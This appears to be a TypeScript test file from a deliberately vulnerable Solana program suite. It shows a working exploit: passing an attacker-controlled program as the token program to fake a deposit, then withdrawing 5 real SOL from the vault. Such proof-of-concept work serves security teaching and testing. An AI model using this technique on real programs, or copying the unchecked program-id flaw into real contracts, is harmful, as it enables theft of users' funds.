/**
 * VULN 15 — arbitrary "token program" → phantom deposit → SOL theft.
 *
 * `deposit_tokens` builds the SPL transfer CPI against whatever program id
 * the caller passes and credits the requested amount unconditionally.
 * The attacker passes the ATTACKER program (its mode 3 silently succeeds on
 * the SPL `Transfer` opcode), "deposits" 5 SOL worth of tokens that never
 * existed — and withdraws 5 REAL SOL from the protocol vault.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  createMint, createAccount, solBalance, tokenBalance, BN, LAMPORTS_PER_SOL,
} from "./util";

describe("vuln15 fake token program / phantom deposit", () => {
  const program = anchorProgram("vuln15_token_program", PROG_IDS.vuln15);
  const solVault = findPda([seedsBuf("sol_vault")[0]], PROG_IDS.vuln15)[0];
  const tokenVault = findPda([seedsBuf("token_vault")[0]], PROG_IDS.vuln15)[0];
  const depOf = (user: any) =>
    findPda([seedsBuf("deposit")[0], user.publicKey.toBuffer()], PROG_IDS.vuln15)[0];

  let attacker: any, mint: any, attackerAta: any, deposit: PublicKey;
  let attackerBefore = 0;
  const STEAL = 5 * LAMPORTS_PER_SOL;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    attacker = await newFundedKeypair();

    mint = await createMint(provider.connection, provider.wallet.payer, provider.wallet.publicKey, null, 6);
    attackerAta = await createAccount(provider.connection, provider.wallet.payer, mint, attacker.publicKey);
    // The attacker owns ZERO tokens — the "deposit" will be pure fiction.

    await program.methods.initialize(new BN(10 * LAMPORTS_PER_SOL))
      .accounts({ solVault, vaultAta: tokenVault, mint, treasury: provider.wallet.publicKey })
      .rpc();

    assert.isAtLeast(await solBalance(solVault), 10 * LAMPORTS_PER_SOL); // funding + rent
  });

  it("phantom deposit via the attacker program as the 'token program'", async () => {
    deposit = depOf(attacker);
    await program.methods.depositTokens(new BN(STEAL))
      .accounts({
        deposit,
        tokenProgram: PROG_IDS.attacker,   // <- CPI target: attacker program
        userAta: attackerAta,              // <- empty / never read
        vaultAta: tokenVault,
        mint,
        solVault,
        user: attacker.publicKey,
      })
      .signers([attacker]).rpc();

    const dep = await program.account.deposit.fetch(deposit);
    assert.equal(dep.amount.toString(), STEAL.toString());

    // Nothing moved in token-land: the transfer is a lie.
    assert.equal((await tokenBalance(attackerAta)).toString(), "0");
  });

  it("attacker withdraws 5 REAL SOL against the phantom credit", async () => {
    attackerBefore = await solBalance(attacker.publicKey);
    const vaultBefore = await solBalance(solVault);

    await program.methods.withdrawSol(new BN(STEAL))
      .accounts({ deposit, solVault, user: attacker.publicKey })
      .signers([attacker]).rpc();

    const after = await solBalance(attacker.publicKey);
    assert.isAtLeast(after - attackerBefore, STEAL - 10_000);
    assert.equal(vaultBefore - (await solBalance(solVault)), STEAL);

    const dep = await program.account.deposit.fetch(deposit);
    assert.equal(dep.amount.toString(), "0");
  });
});
